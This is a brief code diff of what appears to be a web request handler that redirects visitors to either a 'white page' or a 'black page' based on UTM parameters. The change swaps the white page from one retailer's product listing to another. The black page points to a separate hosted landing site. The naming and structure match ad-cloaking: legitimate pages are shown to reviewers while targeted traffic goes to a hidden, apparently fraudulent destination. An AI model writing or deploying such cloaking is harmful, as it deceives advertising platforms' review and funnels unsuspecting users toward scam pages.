@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.otto.de/p/tillvex-feldbett-campingbett-280kg-campingliege-klappbar-sonnenliege-feldbett-campingbett-klappbar-mit-tragetasche-nackenkissen-bis-280-kg-klappbett-gaestebett-faltbar-garten-camping-festival-reise-S0SD30JB/?variationId=S0SD30JB8VZM";
+    const whitePageURL = "https://www.coolblue.be/en/product/952183/bluebuilt-protective-back-cover-google-pixel-9-9-pro-transparent.html";
     const blackPageURL = "https://casssshlov.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
